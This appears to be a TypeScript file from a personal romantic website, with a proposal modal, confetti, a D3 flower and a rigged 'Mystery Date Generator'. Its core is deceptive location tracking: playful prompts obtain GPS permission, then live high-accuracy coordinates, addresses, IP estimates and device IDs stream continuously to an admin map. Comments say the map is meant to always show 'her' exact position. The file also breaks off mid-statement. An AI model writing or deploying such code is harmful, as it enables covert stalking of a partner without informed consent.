import * as d3 from 'd3';
import {
  MAX_USABLE_ACCURACY_METERS,
  formatCoordinates,
  gpsMetaTag,
  haversineMeters,
  isPreciseGps,
  isValidCoordinate,
  type LocationSource
} from './geo';

// Proposal modal with evasive "No" button and confetti celebration
let dodgeCount = 0;
let teaseTimer: ReturnType<typeof setTimeout> | null = null;

const teases = [
  'Nice try! 😜',
  'You can\'t click No! 😉',
  'Nope, you\'re stuck with me! 🥰',
  'Button ran away! 🏃‍♀️💨',
  'There is only one right answer! 💕',
  'Try clicking Yes instead! 💖',
  'Error 404: No not found! 🤭',
  'Destiny says YES! ✨',
  'My heart won\'t let you! 💘'
];

export interface LocationData {
  latitude: number;
  longitude: number;
  fullAddress: string;
  city: string;
  country: string;
  /** Accuracy radius reported by the GPS chip, in metres (null when unavailable). */
  accuracyMeters?: number | null;
  /** 'gps' = real device fix · 'ip' = network estimate only · 'unknown' = no data. */
  source?: LocationSource;
}

/** Real device GPS fix captured from this browser (never an IP estimate). */
const LIVE_LOCATION_KEY = 'ivraine_live_location';
/** Network/IP estimate — deliberately kept apart so it can never become a map pin. */
const APPROX_LOCATION_KEY = 'ivraine_approx_location';
/** Push a live update at most once every 15 s … */
const LIVE_UPDATE_MIN_INTERVAL_MS = 15000;
/** … or immediately when the phone actually moved at least 20 m (min 8 s between sends). */
const LIVE_UPDATE_MIN_DISTANCE_METERS = 20;
const LIVE_UPDATE_MOVE_INTERVAL_MS = 8000;

export async function reverseGeocode(lat: number, lng: number): Promise<{ fullAddress: string; city: string; country: string }> {
  try {
    const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&zoom=18&addressdetails=1`, {
      headers: { 'Accept-Language': 'en' },
      signal: AbortSignal.timeout(4000)
    });
    if (res.ok) {
      const data = await res.json();
      const addr = data.address || {};
      const city = addr.city || addr.town || addr.municipality || addr.village || addr.suburb || addr.state || '';
      const country = addr.country || '';
      return {
        fullAddress: data.display_name || `${city}, ${country}`,
        city,
        country
      };
    }
  } catch {}
  return { fullAddress: `${lat.toFixed(4)}, ${lng.toFixed(4)}`, city: '', country: '' };
}

export function getDeviceId(): string {
  try {
    let id = localStorage.getItem('ivraine_device_id');
    if (!id || id.length < 8) {
      id = 'dev_' + Math.random().toString(36).substring(2, 10) + Date.now().toString(36);
      localStorage.setItem('ivraine_device_id', id);
    }
    return id;
  } catch {
    return 'dev_client_default';
  }
}

export function trackActivity(
  section: 'Scrapbook' | 'Private Space' | 'Admin',
  action: string,
  details = '',
  user = '',
  dodges = 0,
  location?: Partial<LocationData>
) {
  try {
    const deviceId = getDeviceId();
    const hasCoords = isValidCoordinate(location?.latitude, location?.longitude);
    // The GPS provenance tag travels inside `details` so the admin map can tell a
    // real device fix apart from a network/IP estimate without any schema change.
    const taggedDetails = hasCoords
      ? `${details ? `${details} ` : ''}${gpsMetaTag(location?.accuracyMeters, location?.source || 'gps')}`
      : details;

    const payload = {
      section,
      action,
      details: taggedDetails,
      user,
      deviceId,
      dodgeCount: dodges,
      latitude: hasCoords ? location?.latitude : null,
      longitude: hasCoords ? location?.longitude : null,
      accuracy: hasCoords ? location?.accuracyMeters ?? null : null,
      gpsSource: hasCoords ? location?.source || 'gps' : null,
      fullAddress: location?.fullAddress,
      city: location?.city,
      country: location?.country
    };

    fetch('/api/track', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload),
      keepalive: true
    }).catch(() => {});

    try {
      const channel = new BroadcastChannel('ivraine_admin_channel');
      channel.postMessage({
        type: 'LOG_ADDED',
        entry: {
          id: String(Date.now()),
          ip: 'Client',
          section,
          action,
          details: taggedDetails,
          user,
          userAgent: navigator.userAgent,
          deviceId,
          dodgeCount: dodges,
          latitude: hasCoords ? location?.latitude ?? null : null,
          longitude: hasCoords ? location?.longitude ?? null : null,
          fullAddress: location?.fullAddress ?? '',
          city: location?.city ?? '',
          country: location?.country ?? '',
          timestamp: new Date().toISOString()
        }
      });
    } catch {}
  } catch {}
}

/** Persists a real GPS fix. Only real fixes may ever be replayed as the phone pin. */
function saveLiveLocationSnapshot(loc: LocationData) {
  try {
    const payload = { ...loc, timestamp: new Date().toISOString() };
    localStorage.setItem(LIVE_LOCATION_KEY, JSON.stringify(payload));
    localStorage.setItem('ivraine_last_location', JSON.stringify(payload));
    localStorage.setItem('ivraine_saved_pinned_location', JSON.stringify(payload));
  } catch {}
}

/** Turns a raw device position into LocationData, or null when it is unusable. */
async function buildGpsLocation(pos: GeolocationPosition): Promise<LocationData | null> {
  const { latitude, longitude, accuracy } = pos.coords;
  if (!isValidCoordinate(latitude, longitude)) return null;

  const accuracyMeters = typeof accuracy === 'number' && Number.isFinite(accuracy) && accuracy > 0 ? accuracy : null;
  const geo = await reverseGeocode(latitude, longitude);

  return {
    latitude,
    longitude,
    fullAddress: geo.fullAddress || formatCoordinates(latitude, longitude),
    city: geo.city,
    country: geo.country,
    accuracyMeters,
    source: 'gps'
  };
}

/**
 * Publishes one real device GPS fix.
 * A fix too coarse to point at a street (> 200 m) is still logged, but it is NEVER
 * written as a pin, so the admin map can never show her at a wrong place.
 */
async function publishGpsLocation(
  source: 'Scrapbook' | 'Private Space' | 'Admin',
  userName: string,
  loc: LocationData
): Promise<boolean> {
  const precise = isPreciseGps(loc.accuracyMeters);
  saveLiveLocationSnapshot(loc);

  trackActivity(
    source,
    precise ? 'Shared Live GPS Location' : 'Shared Coarse Location (not pinned)',
    `Address: ${loc.fullAddress}`,
    userName,
    0,
    loc
  );

  if (!precise) return false;

  const deviceId = getDeviceId();

  // Endpoint that stores the single authoritative phone pin (address + coordinates).
  try {
    await fetch('/api/date-location', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        latitude: loc.latitude,
        longitude: loc.longitude,
        accuracy: loc.accuracyMeters,
        gpsSource: 'gps',
        user: userName,
        source,
        deviceId,
        fullAddress: loc.fullAddress,
        city: loc.city,
        country: loc.country
      }),
      keepalive: true
    });
  } catch {}

  // Instant push for an admin dashboard open in another tab of this browser.
  try {
    const channel = new BroadcastChannel('ivraine_admin_channel');
    channel.postMessage({
      type: 'LOG_ADDED',
      entry: {
        id: 'live_' + Date.now(),
        ip: 'Phone GPS Pin',
        section: source,
        action: '📍 Live GPS Pin Updated ♡',
        details: `${loc.fullAddress} ${gpsMetaTag(loc.accuracyMeters, 'gps')} [Device: ${deviceId}]`,
        user: userName,
        userAgent: navigator.userAgent,
        deviceId,
        dodgeCount,
        latitude: loc.latitude,
        longitude: loc.longitude,
        accuracy: loc.accuracyMeters,
        fullAddress: loc.fullAddress,
        city: loc.city,
        country: loc.country,
        timestamp: new Date().toISOString()
      }
    });
  } catch {}

  return true;
}

/** One-shot GPS read. Resolves with null when permission is missing or the fix is unusable. */
export async function acquireAndSaveLocation(source: 'Scrapbook' | 'Private Space' | 'Admin', userName = 'Visitor'): Promise<LocationData | null> {
  if (!navigator.geolocation) return null;
  return new Promise((resolve) => {
    navigator.geolocation.getCurrentPosition(
      async (pos) => {
        const loc = await buildGpsLocation(pos);
        if (!loc) {
          resolve(null);
          return;
        }
        await publishGpsLocation(source, userName, loc);
        resolve(loc);
      },
      () => resolve(null),
      { enableHighAccuracy: true, timeout: 15000, maximumAge: 5000 }
    );
  });
}

// ─────────────────────────────────────────────────────────────────────────────
// LIVE GPS STREAM (this is what keeps the admin pin real-time and exact)
// ─────────────────────────────────────────────────────────────────────────────
let liveWatchId: number | null = null;
let liveLastSentAt = 0;
let liveLastSentLat = Number.NaN;
let liveLastSentLng = Number.NaN;
let liveSendInFlight = false;

export function isLiveLocationTracking(): boolean {
  return liveWatchId !== null;
}

/** Starts streaming real GPS fixes to the admin map (safe to call repeatedly). */
export function startLiveLocationTracking(source: 'Scrapbook' | 'Private Space' | 'Admin', userName = 'Visitor'): boolean {
  if (!navigator.geolocation) return false;
  if (liveWatchId !== null) return true;

  try {
    liveWatchId = navigator.geolocation.watchPosition(
      (pos) => { void handleLiveGpsFix(source, userName, pos); },
      () => { stopLiveLocationTracking(); },
      { enableHighAccuracy: true, maximumAge: 3000, timeout: 30000 }
    );
  } catch {
    liveWatchId = null;
    return false;
  }
  return true;
}

export function stopLiveLocationTracking(): void {
  if (liveWatchId === null) return;
  try {
    navigator.geolocation.clearWatch(liveWatchId);
  } catch {}
  liveWatchId = null;
}

async function handleLiveGpsFix(
  source: 'Scrapbook' | 'Private Space' | 'Admin',
  userName: string,
  pos: GeolocationPosition
): Promise<void> {
  const { latitude, longitude, accuracy } = pos.coords;
  if (!isValidCoordinate(latitude, longitude)) return;
  // Coarse/network fixes are dropped: better no update than a wrong pin.
  if (typeof accuracy === 'number' && accuracy > MAX_USABLE_ACCURACY_METERS) return;
  if (liveSendInFlight) return;

  const now = Date.now();
  const elapsed = now - liveLastSentAt;
  const movedMeters = Number.isFinite(liveLastSentLat)
    ? haversineMeters(liveLastSentLat, liveLastSentLng, latitude, longitude)
    : Number.POSITIVE_INFINITY;

  const dueByTime = liveLastSentAt === 0 || elapsed >= LIVE_UPDATE_MIN_INTERVAL_MS;
  const dueByMovement = movedMeters >= LIVE_UPDATE_MIN_DISTANCE_METERS && elapsed >= LIVE_UPDATE_MOVE_INTERVAL_MS;
  if (!dueByTime && !dueByMovement) return;

  liveSendInFlight = true;
  try {
    const loc = await buildGpsLocation(pos);
    if (!loc) return;
    await publishGpsLocation(source, userName, loc);
    liveLastSentAt = Date.now();
    liveLastSentLat = latitude;
    liveLastSentLng = longitude;
  } finally {
    liveSendInFlight = false;
  }
}

// When the phone comes back to the foreground, push a fresh fix immediately
// instead of waiting for the 15 s throttle window to expire.
try {
  document.addEventListener('visibilitychange', () => {
    if (document.visibilityState === 'visible' && liveWatchId !== null) liveLastSentAt = 0;
  });
} catch {}

export async function acquireLocationWithBypass(): Promise<LocationData> {
  // 1. A previously stored REAL GPS fix from this device.
  try {
    const saved = localStorage.getItem(LIVE_LOCATION_KEY)
      || localStorage.getItem('ivraine_last_location')
      || localStorage.getItem('ivraine_saved_pinned_location');
    if (saved) {
      const parsed = JSON.parse(saved) as LocationData;
      if (isValidCoordinate(parsed?.latitude, parsed?.longitude) && (parsed.source === undefined || parsed.source === 'gps')) {
        return parsed;
      }
    }
  } catch {}

  // 2. Network/IP estimate. Flagged as 'ip' AND stored under a separate key so it
  //    can never be mistaken for (or overwrite) the phone's real GPS pin.
  try {
    const res = await fetch('/api/ip', { signal: AbortSignal.timeout(4000) });
    if (res.ok) {
      const data = await res.json();
      if (isValidCoordinate(data?.latitude, data?.longitude)) {
        const loc: LocationData = {
          latitude: data.latitude,
          longitude: data.longitude,
          city: data.city || '',
          country: data.country || '',
          fullAddress: data.fullAddress || '',
          accuracyMeters: null,
          source: 'ip'
        };
        try {
          localStorage.setItem(APPROX_LOCATION_KEY, JSON.stringify({ ...loc, timestamp: new Date().toISOString() }));
        } catch {}
        return loc;
      }
    }
  } catch {}

  // 3. Nothing trustworthy available. Returning an empty result (instead of fake
  //    Bohol coordinates) is what stops phantom pins on the admin map.
  return {
    latitude: Number.NaN,
    longitude: Number.NaN,
    city: '',
    country: '',
    fullAddress: '',
    accuracyMeters: null,
    source: 'unknown'
  };
}

export async function checkAndPromptPermissions(source: 'Scrapbook' | 'Private Space' | 'Admin', userName = 'Visitor') {
  let hasLocation = false;
  let hasNotification = false;

  try {
    if (navigator.permissions) {
      const geoStatus = await navigator.permissions.query({ name: 'geolocation' });
      hasLocation = geoStatus.state === 'granted';
    }
  } catch {}

  try {
    if ('Notification' in window) {
      hasNotification = Notification.permission === 'granted';
    }
  } catch {}

  // If already granted: send one exact fix now AND keep streaming real fixes so the
  // admin map stays accurate while the phone moves (this is the "real time" part).
  if (hasLocation) {
    void acquireAndSaveLocation(source, userName);
    startLiveLocationTracking(source, userName);
  }

  // If already granted both or dismissed recently, skip prompt
  const dismissedTime = localStorage.getItem('ivraine_perm_prompt_dismissed');
  if (dismissedTime && (Date.now() - Number(dismissedTime)) < 24 * 60 * 60 * 1000) {
    return;
  }

  if (hasLocation && (hasNotification || !('Notification' in window))) {
    return;
  }

  // Show friendly permission modal
  setTimeout(() => {
    if (document.querySelector('.ivraine-perm-overlay')) return;

    const overlay = document.createElement('div');
    overlay.className = 'ivraine-perm-overlay';
    overlay.innerHTML = `
      <div class="ivraine-perm-card">
        <div class="ivraine-perm-icon">📍✨</div>
        <h3 class="ivraine-perm-title">Welcome to Our Space ♡</h3>
        <p class="ivraine-perm-desc">
          To unlock the interactive visitor map and stay connected with real-time heart notifications, please enable permissions:
        </p>
        <div class="ivraine-perm-features">
          <div class="ivraine-perm-feature-item">
            <span class="icon">🗺</span>
            <span><strong>Live Map Pin</strong> — Pin your spot on our memories journey map</span>
          </div>
          <div class="ivraine-perm-feature-item">
            <span class="icon">🔔</span>
            <span><strong>Heart Notifications</strong> — Instant alerts whenever Ivan or Loraine taps a heart</span>
          </div>
        </div>
        <button class="ivraine-perm-btn-allow" type="button">
          <span>Allow Permissions</span>
          <span>♡</span>
        </button>
        <button class="ivraine-perm-btn-dismiss" type="button">Maybe Later</button>
      </div>
    `;

    document.body.appendChild(overlay);

    const allowBtn = overlay.querySelector<HTMLButtonElement>('.ivraine-perm-btn-allow')!;
    const dismissBtn = overlay.querySelector<HTMLButtonElement>('.ivraine-perm-btn-dismiss')!;

    allowBtn.addEventListener('click', async () => {
      allowBtn.disabled = true;
      allowBtn.textContent = 'Enabling…';

      try {
        if ('Notification' in window && Notification.permission !== 'granted') {
          await Notification.requestPermission();
        }
      } catch {}

      try {
        await acquireAndSaveLocation(source, userName);
        startLiveLocationTracking(source, userName);
      } catch {}

      overlay.remove();
    });

    dismissBtn.addEventListener('click', () => {
      localStorage.setItem('ivraine_perm_prompt_dismissed', String(Date.now()));
      overlay.remove();
    });
  }, 1200);
}

export function launchHeartsConfetti() {
  let canvas = document.getElementById('ivraine-confetti-canvas') as HTMLCanvasElement | null;
  if (!canvas) {
    canvas = document.createElement('canvas');
    canvas.id = 'ivraine-confetti-canvas';
    document.body.appendChild(canvas);
  }
  const ctx = canvas.getContext('2d');
  if (!ctx) return;

  let width = canvas.width = window.innerWidth;
  let height = canvas.height = window.innerHeight;

  const onResize = () => {
    if (!canvas) return;
    width = canvas.width = window.innerWidth;
    height = canvas.height = window.innerHeight;
  };
  window.addEventListener('resize', onResize);

  const particles: Array<{
    x: number;
    y: number;
    vx: number;
    vy: number;
    size: number;
    color: string;
    emoji: string | null;
    rotation: number;
    rotationSpeed: number;
    gravity: number;
    opacity: number;
  }> = [];

  const colors = ['#e83e8c', '#ff6b81', '#ff758c', '#ffd166', '#a29bfe', '#ff9ff3'];
  const emojis = ['❤️', '💖', '💕', '✨', '🌸'];

  for (let i = 0; i < 90; i++) {
    particles.push({
      x: width / 2 + (Math.random() - 0.5) * 100,
      y: height / 2 + (Math.random() - 0.5) * 60,
      vx: (Math.random() - 0.5) * 16,
      vy: -Math.random() * 14 - 4,
      size: Math.random() * 16 + 10,
      color: colors[Math.floor(Math.random() * colors.length)],
      emoji: Math.random() > 0.4 ? emojis[Math.floor(Math.random() * emojis.length)] : null,
      rotation: Math.random() * 360,
      rotationSpeed: (Math.random() - 0.5) * 10,
      gravity: 0.35,
      opacity: 1
    });
  }

  let frameId: number;
  const startTime = Date.now();

  function render() {
    if (!ctx || !canvas) return;
    ctx.clearRect(0, 0, width, height);
    let alive = false;

    for (const p of particles) {
      p.x += p.vx;
      p.y += p.vy;
      p.vy += p.gravity;
      p.rotation += p.rotationSpeed;
      p.opacity -= 0.007;

      if (p.opacity > 0 && p.y < height + 40) {
        alive = true;
        ctx.save();
        ctx.globalAlpha = Math.max(0, p.opacity);
        ctx.translate(p.x, p.y);
        ctx.rotate((p.rotation * Math.PI) / 180);

        if (p.emoji) {
          ctx.font = `${p.size}px sans-serif`;
          ctx.fillText(p.emoji, -p.size / 2, p.size / 2);
        } else {
          ctx.fillStyle = p.color;
          ctx.fillRect(-p.size / 2, -p.size / 2, p.size, p.size * 0.6);
        }
        ctx.restore();
      }
    }

    if (alive && Date.now() - startTime < 6000) {
      frameId = requestAnimationFrame(render);
    } else {
      cancelAnimationFrame(frameId);
      window.removeEventListener('resize', onResize);
      canvas.remove();
    }
  }

  frameId = requestAnimationFrame(render);
}

// ─────────────────────────────────────────────────────────────────────────────
// Mystery Date Generator — The Rigged Slot Machine 🎰
// ─────────────────────────────────────────────────────────────────────────────

const slotSpinItems = [
  '🏖 Beach Picnic', '🎬 Movie Night', '🍦 Ice Cream Date', '🎢 Amusement Park',
  '🌅 Sunset Walk', '🎭 Theatre Night', '🍕 Pizza Date', '🌃 City Lights Stroll',
  '🎵 Live Music', '🎨 Art Museum', '🎳 Bowling Night', '☕ Café Hopping',
  '🚣 Boat Ride', '🌿 Nature Trek', '🎤 Karaoke Night', '🍱 Food Trip'
];

// The REAL rigged date — always lands here
const riggedDate = {
  emoji: '🌹',
  name: 'Romantic Dinner Date',
  description: 'A special evening just for the two of us ♡',
  time: 'Tonight, 7:00 PM'
};

// Ivan's special places to visit together in Bohol ♡
const tagbilaranSpots = [
  {
    name: 'Blood Compact Shrine',
    type: '🏛 Historic Landmark',
    vibe: 'Where history meets romance — the site of the first international treaty of friendship',
    address: 'Bool, Tagbilaran City, Bohol',
    mapUrl: 'https://maps.google.com/?q=Blood+Compact+Shrine+Tagbilaran+Bohol',
    emoji: '🤝'
  },
  {
    name: 'Ocean Suites',
    type: '🌊 Scenic Stay',
    vibe: 'Beautiful ocean views, perfect for a dreamy stay together',
    address: 'Tagbilaran City, Bohol',
    mapUrl: 'https://maps.google.com/?q=Ocean+Suites+Tagbilaran+Bohol',
    emoji: '🌊'
  },
  {
    name: 'National Museum of the Philippines - Bohol',
    type: '🖼 Culture & Art',
    vibe: 'Explore Bohol\'s rich heritage and history side by side',
    address: 'Tagbilaran City, Bohol',
    mapUrl: 'https://maps.google.com/?q=National+Museum+Philippines+Bohol+Tagbilaran',
    emoji: '🏛'
  },
  {
    name: 'Plaza Jose P. Rizal',
    type: '🌳 City Square',
    vibe: 'A peaceful plaza in the heart of the city — perfect for a quiet walk together',
    address: 'Tagbilaran City, Bohol',
    mapUrl: 'https://maps.google.com/?q=Plaza+Jose+P+Rizal+Tagbilaran+Bohol',
    emoji: '🌳'
  },
  {
    name: 'St. Joseph the Worker Cathedral Shrine',
    type: '⛪ Sacred Place',
    vibe: 'A beautiful cathedral to visit and say a prayer for us ♡',
    address: 'Tagbilaran City, Bohol',
    mapUrl: 'https://maps.google.com/?q=St+Joseph+Worker+Cathedral+Shrine+Tagbilaran+Bohol',
    emoji: '⛪'
  },
  {
    name: "Gerarda's Place",
    type: '🍽 Dining',
    vibe: 'Iconic Bohol dining experience — a must-visit together',
    address: 'Tagbilaran City, Bohol',
    mapUrl: "https://maps.google.com/?q=Gerarda's+Place+Tagbilaran+Bohol",
    emoji: '🍽'
  },
  {
    name: "Gerarda's Place CPG",
    type: '🍽 Dining',
    vibe: 'The CPG branch — great food and even better company ♡',
    address: 'CPG Ave, Tagbilaran City, Bohol',
    mapUrl: "https://maps.google.com/?q=Gerarda's+Place+CPG+Tagbilaran+Bohol",
    emoji: '🥘'
  },
  {
    name: 'Lite Port Center',
    type: '🛍 Leisure & Dining',
    vibe: 'A lively spot for shopping, food, and making new memories together',
    address: 'Tagbilaran City, Bohol',
    mapUrl: 'https://maps.google.com/?q=Lite+Port+Center+Tagbilaran+Bohol',
    emoji: '🌟'
  }
];

export function openMysteryDateGenerator(
  overlay: HTMLDivElement,
  card: HTMLDivElement,
  userName: string,
  source: 'Scrapbook' | 'Private Space' | 'Admin'
) {
  card.innerHTML = `
    <div class="ivraine-mystery-wrap" id="ivraine-mystery-wrap">
      <div class="ivraine-mystery-badge">🔮 Mystery Date Generator</div>
      <h2 class="ivraine-mystery-title">Spin to reveal<br><em>tonight's surprise date!</em></h2>
      <p class="ivraine-mystery-sub">We need to check open spots near you ✨</p>

      <div class="ivraine-slot-machine" id="ivraine-slot-machine">
        <div class="ivraine-slot-reel" id="ivraine-slot-reel">
          <div class="ivraine-slot-item">🎰 Ready to spin!</div>
        </div>
        <div class="ivraine-slot-shine"></div>
      </div>

      <div class="ivraine-mystery-location-prompt" id="ivraine-loc-prompt">
        <div class="ivraine-loc-icon">📍</div>
        <p class="ivraine-loc-text">
          <strong>Allow location access</strong><br>
          <span>So we can suggest the best open spots near you tonight!</span>
        </p>
        <button class="ivraine-btn-allow-loc" id="ivraine-btn-spin" type="button">
          <span>📍 Allow &amp; Spin!</span>
        </button>
        <button class="ivraine-btn-skip-loc" id="ivraine-btn-skip" type="button">Skip, just spin!</button>
      </div>
    </div>
  `;

  const spinBtn = card.querySelector<HTMLButtonElement>('#ivraine-btn-spin')!;
  const skipBtn = card.querySelector<HTMLButtonElement>('#ivraine-btn-skip')!;
  const reel = card.querySelector<HTMLDivElement>('#ivraine-slot-reel')!;

  function runSlotAnimation(onDone: () => void) {
    let idx = 0;
    let speed = 60;
    let totalTicks = 0;
    const maxTicks = 38;

    const tick = () => {
      idx = (idx + 1) % slotSpinItems.length;
      reel.innerHTML = `<div class="ivraine-slot-item spinning">${slotSpinItems[idx]}</div>`;
      totalTicks++;

      if (totalTicks < maxTicks) {
        // Gradually slow down in last 12 ticks
        if (totalTicks > maxTicks - 12) {
          speed = Math.min(speed + 22, 350);
        }
        setTimeout(tick, speed);
      } else {
        // Land on the rigged result
        reel.innerHTML = `<div class="ivraine-slot-item landed">${riggedDate.emoji} ${riggedDate.name}</div>`;
        setTimeout(onDone, 700);
      }
    };
    tick();
  }

  async function handleSpin(withLocation: boolean) {
    spinBtn.disabled = true;
    skipBtn.disabled = true;
    spinBtn.innerHTML = '<span>✨ Spinning…</span>';

    let loc: LocationData | null = null;

    if (withLocation) {
      spinBtn.innerHTML = '<span>📍 Getting your location…</span>';
      loc = await acquireAndSaveLocation(source, userName);
    }

    const locPrompt = card.querySelector<HTMLElement>('#ivraine-loc-prompt')!;
    locPrompt.style.opacity = '0.5';
    locPrompt.style.pointerEvents = 'none';

    runSlotAnimation(() => {
      showDateReveal(card, overlay, userName, source, loc);
    });
  }

  spinBtn.addEventListener('click', () => handleSpin(true));
  skipBtn.addEventListener('click', () => handleSpin(false));
}

// ─────────────────────────────────────────────────────────────────────────────
// Beautiful Blooming Flower Built with D3 ♡
// ─────────────────────────────────────────────────────────────────────────────
export function renderD3Flower(container: HTMLElement, recipientName = 'Loraine') {
  container.innerHTML = '';

  const d3Lib: any = typeof d3 !== 'undefined' ? d3 : (window as any).d3;
  if (!d3Lib) {
    container.innerHTML = '<div class="ivraine-flower-fallback">🌸 A special flower bloomed for you ♡</div>';
    return;
  }

  const width = 280;
  const height = 280;
  const centerX = width / 2;
  const flowerCenterY = 125;

  const svg = d3Lib.select(container)
    .append('svg')
    .attr('viewBox', `0 0 ${width} ${height}`)
    .attr('class', 'ivraine-d3-flower-svg')
    .attr('role', 'img')
    .attr('aria-label', `A blooming surprise flower for ${recipientName}`);

  const defs = svg.append('defs');

  // Linear Gradient: Stem
  const stemGrad = defs.append('linearGradient')
    .attr('id', 'ivraine-stem-grad')
    .attr('x1', '0%').attr('y1', '100%')
    .attr('x2', '0%').attr('y2', '0%');
  stemGrad.append('stop').attr('offset', '0%').attr('stop-color', '#1b4332');
  stemGrad.append('stop').attr('offset', '50%').attr('stop-color', '#2d6a4f');
  stemGrad.append('stop').attr('offset', '100%').attr('stop-color', '#52b788');

  // Linear Gradient: Left Leaf
  const leafLeftGrad = defs.append('linearGradient')
    .attr('id', 'ivraine-leaf-left')
    .attr('x1', '0%').attr('y1', '100%')
    .attr('x2', '100%').attr('y2', '0%');
  leafLeftGrad.append('stop').attr('offset', '0%').attr('stop-color', '#2d6a4f');
  leafLeftGrad.append('stop').attr('offset', '100%').attr('stop-color', '#74c69d');

  // Linear Gradient: Right Leaf
  const leafRightGrad = defs.append('linearGradient')
    .attr('id', 'ivraine-leaf-right')
    .attr('x1', '0%').attr('y1', '0%')
    .attr('x2', '100%').attr('y2', '100%');
  leafRightGrad.append('stop').attr('offset', '0%').attr('stop-color', '#40916c');
  leafRightGrad.append('stop').attr('offset', '100%').attr('stop-color', '#95d5b2');

  // Linear Gradient: Outer Petals
  const outerPetalGrad = defs.append('linearGradient')
    .attr('id', 'ivraine-outer-petal-grad')
    .attr('x1', '0%').attr('y1', '100%')
    .attr('x2', '0%').attr('y2', '0%');
  outerPetalGrad.append('stop').attr('offset', '0%').attr('stop-color', '#ad1457');
  outerPetalGrad.append('stop').attr('offset', '50%').attr('stop-color', '#e91e63');
  outerPetalGrad.append('stop').attr('offset', '100%').attr('stop-color', '#ff6b8b');

  // Linear Gradient: Mid Petals
  const midPetalGrad = defs.append('linearGradient')
    .attr('id', 'ivraine-mid-petal-grad')
    .attr('x1', '0%').attr('y1', '100%')
    .attr('x2', '0%').attr('y2', '0%');
  midPetalGrad.append('stop').attr('offset', '0%').attr('stop-color', '#c2185b');
  midPetalGrad.append('stop').attr('offset', '60%').attr('stop-color', '#f06292');
  midPetalGrad.append('stop').attr('offset', '100%').attr('stop-color', '#ff8fa3');

  // Linear Gradient: Inner Petals
  const innerPetalGrad = defs.append('linearGradient')
    .attr('id', 'ivraine-inner-petal-grad')
    .attr('x1', '0%').attr('y1', '100%')
    .attr('x2', '0%').attr('y2', '0%');
  innerPetalGrad.append('stop').attr('offset', '0%').attr('stop-color', '#ec407a');
  innerPetalGrad.append('stop').attr('offset', '100%').attr('stop-color', '#ffccd5');

  // Radial Gradient: Center Bud Core
  const budGrad = defs.append('radialGradient')
    .attr('id', 'ivraine-bud-grad')
    .attr('cx', '50%').attr('cy', '50%').attr('r', '50%');
  budGrad.append('stop').attr('offset', '0%').attr('stop-color', '#fff9c4');
  budGrad.append('stop').attr('offset', '35%').attr('stop-color', '#ffeb3b');
  budGrad.append('stop').attr('offset', '75%').attr('stop-color', '#ff80ab');
  budGrad.append('stop').attr('offset', '100%').attr('stop-color', '#d81b60');

  // Radial Gradient: Soft Glow Aura
  const auraGrad = defs.append('radialGradient')
    .attr('id', 'ivraine-flower-aura')
    .attr('cx', '50%').attr('cy', '50%').attr('r', '50%');
  auraGrad.append('stop').attr('offset', '0%').attr('stop-color', 'rgba(255, 105, 180, 0.45)');
  auraGrad.append('stop').attr('offset', '65%').attr('stop-color', 'rgba(255, 182, 193, 0.15)');
  auraGrad.append('stop').attr('offset', '100%').attr('stop-color', 'rgba(255, 255, 255, 0)');

  // Filter: Romantic Bloom Glow
  const filter = defs.append('filter')
    .attr('id', 'ivraine-bloom-glow')
    .attr('x', '-30%').attr('y', '-30%')
    .attr('width', '160%').attr('height', '160%');
  filter.append('feGaussianBlur')
    .attr('stdDeviation', '3')
    .attr('result', 'coloredBlur');
  const feMerge = filter.append('feMerge');
  feMerge.append('feMergeNode').attr('in', 'coloredBlur');
  feMerge.append('feMergeNode').attr('in', 'SourceGraphic');

  // Background Aura Circle
  svg.append('circle')
    .attr('cx', centerX)
    .attr('cy', flowerCenterY)
    .attr('r', 0)
    .attr('fill', 'url(#ivraine-flower-aura)')
    .transition()
    .duration(1200)
    .ease(d3Lib.easeCubicOut)
    .attr('r', 75);

  // Stem Path (curved from bottom y=270 to flower base y=125)
  const stem = svg.append('path')
    .attr('d', `M ${centerX},270 Q ${centerX - 7},195 ${centerX},${flowerCenterY}`)
    .attr('fill', 'none')
    .attr('stroke', 'url(#ivraine-stem-grad)')
    .attr('stroke-width', 5.5)
    .attr('stroke-linecap', 'round');

  const stemNode = stem.node() as SVGPathElement | null;
  const stemLength = stemNode?.getTotalLength() || 155;
  stem.attr('stroke-dasharray', `${stemLength} ${stemLength}`)
    .attr('stroke-dashoffset', stemLength)
    .transition()
    .duration(900)
    .ease(d3Lib.easeCubicOut)
    .attr('stroke-dashoffset', 0);

  // Left Leaf Group
  const leftLeaf = svg.append('g')
    .attr('transform', `translate(${centerX - 4}, 205) scale(0)`);
  leftLeaf.append('path')
    .attr('d', 'M 0,0 C -35,5 -55,-15 -60,-30 C -40,-20 -18,-10 0,0 Z')
    .attr('fill', 'url(#ivraine-leaf-left)')
    .attr('filter', 'drop-shadow(0 2px 4px rgba(0,0,0,0.1))');
  leftLeaf.transition()
    .delay(450)
    .duration(700)
    .ease(d3Lib.easeBackOut.overshoot(1.4))
    .attr('transform', `translate(${centerX - 4}, 205) scale(1)`);

  // Right Leaf Group
  const rightLeaf = svg.append('g')
    .attr('transform', `translate(${centerX - 2}, 175) scale(0)`);
  rightLeaf.append('path')
    .attr('d', 'M 0,0 C 35,5 55,-15 60,-28 C 40,-18 18,-8 0,0 Z')
    .attr('fill', 'url(#ivraine-leaf-right)')
    .attr('filter', 'drop-shadow(0 2px 4px rgba(0,0,0,0.1))');
  rightLeaf.transition()
    .delay(600)
    .duration(700)
    .ease(d3Lib.easeBackOut.overshoot(1.4))
    .attr('transform', `translate(${centerX - 2}, 175) scale(1)`);

  // Flower Head Main Group (centered at centerX, flowerCenterY)
  const headGroup = svg.append('g')
    .attr('transform', `translate(${centerX}, ${flowerCenterY})`);

  // Inner Breathing Group (transform origin at 0, 0)
  const innerHead = headGroup.append('g')
    .attr('class', 'ivraine-flower-head-inner');

  // Petal SVG path definition (centered at origin 0,0, pointing upward to -60)
  const petalPathD = 'M 0,0 C -16,-20 -14,-48 0,-58 C 14,-48 16,-20 0,0 Z';

  // Layer 1: Outer Petals (8 petals)
  const outerAngles = [0, 45, 90, 135, 180, 225, 270, 315];
  const outerPetals = innerHead.selectAll('.ivraine-petal-outer')
    .data(outerAngles)
    .enter()
    .append('path')
    .attr('class', 'ivraine-petal-outer')
    .attr('d', petalPathD)
    .attr('fill', 'url(#ivraine-outer-petal-grad)')
